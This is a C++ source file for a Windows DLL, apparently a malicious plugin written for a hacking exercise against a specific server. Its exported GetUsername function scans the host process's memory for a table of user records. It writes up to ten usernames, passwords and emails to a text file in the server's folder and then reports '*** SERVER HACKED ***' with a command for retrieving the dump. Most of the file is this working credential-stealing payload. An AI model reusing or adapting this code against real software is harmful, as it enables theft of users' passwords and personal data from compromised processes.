// dllmain.cpp : Defines the entry point for the DLL application.
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

__declspec(dllexport) BOOLEAN __cdecl GetUsername1(char *UserName, DWORD Size)
{
    if (GetEnvironmentVariableA("username", UserName, Size) > 0)
    {
        return TRUE;
    }

    return FALSE;
}

#define FIELD_SIZE      25
typedef struct _USER_DATA
{
    char Username[FIELD_SIZE];
    char Name[FIELD_SIZE];
    char Email[FIELD_SIZE];
    char Password[FIELD_SIZE];
} USER_DATA;

void WriteUser(HANDLE File, char* Username, char*Pass, char* Email)
{
    char buffer[512];
    DWORD i = 0;

    __debugbreak();

    if (Username)
    {
        while (*Username)
        {
            buffer[i++] = *Username++;
        }

        buffer[i++] = '\t';
    }
    
    if (Pass)
    {
        while (*Pass)
        {
            buffer[i++] = *Pass++;
        }

        buffer[i++] = '\t';
    }

    if (Email)
    {
        while (*Email)
        {
            buffer[i++] = *Email++;
        }

    }
    buffer[i++] = '\n';

    WriteFile(File, buffer, i, NULL, NULL);
}

__declspec(dllexport) BOOLEAN __cdecl GetUsername(char *UserName, DWORD Size)
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    char filename[200];

    
    __try
    {
        PBYTE hproc = INVALID_HANDLE_VALUE;
        DWORD ret = GetModuleFileNameA(GetModuleHandle(NULL), filename, 200);
        if ((ret == 0) || (ret == 200))
        {
            strncpy_s(UserName, Size, "GetModuleFileNameA", Size);
            __leave;
        }

        for (; ret > 0; ret--)
        {
            if (filename[ret] == '\\')
            {
                filename[ret] = 0;
                strncat_s(filename, 200, "\\0\\1000.txt", 200 - ret);

                hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
                if (INVALID_HANDLE_VALUE == hFile)
                {
                    strncpy_s(UserName, Size, filename, Size);
                    __leave;
                }

                break;
            }
        }

        if (ret == 0)
        {
            strncpy_s(UserName, Size, "Found0", Size);
            __leave;
        }

        WriteUser(hFile, "Username", "Password", "Email");

        // now we have to look up in the process address space
        // we can start from the address the process is loaded to, and scan it to find the structure holding usernames/passwords
        hproc = (PBYTE)GetModuleHandle(NULL);
        
        while (TRUE)
        {
            if (*(PDWORD)hproc == 'luar')   // 'raul' is the first user (little endian)
            {
                DWORD i;
                
                for (i = 0; i < 10; i++)
                {
                    USER_DATA *user = (USER_DATA*)hproc;
                    WriteUser(hFile, user->Username, user->Password, user->Email);
                    hproc += sizeof(USER_DATA);
                }

                break;
            }

            hproc += 4;
        }
        
        sprintf_s(UserName, Size, "*** SERVER HACKED ***\nNow use: 'get ..\\0\\1000' to see the result!");
    }
    __finally
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
    }
    
    return TRUE;
}